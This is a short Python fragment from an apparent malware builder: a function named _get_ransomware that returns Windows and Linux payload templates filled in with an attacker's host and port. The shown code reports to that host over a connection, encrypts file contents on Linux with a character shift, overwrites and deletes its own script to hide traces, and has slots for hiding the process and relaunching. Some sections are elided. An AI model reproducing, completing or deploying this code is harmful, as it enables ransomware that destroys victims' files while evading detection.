def _get_ransomware(host,port,platform, strs):
    if platform == 'WINDOWS':
        return """
...
conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
    """.format(host = host, port = str(port), keepyourselfalive = strs[0])
    elif platform == 'LINUX':
        return """
...
\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {})for l in fd))
conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
    """.format(port = str(port) , host = host, hide_process = strs[0], relaunch = strs[1])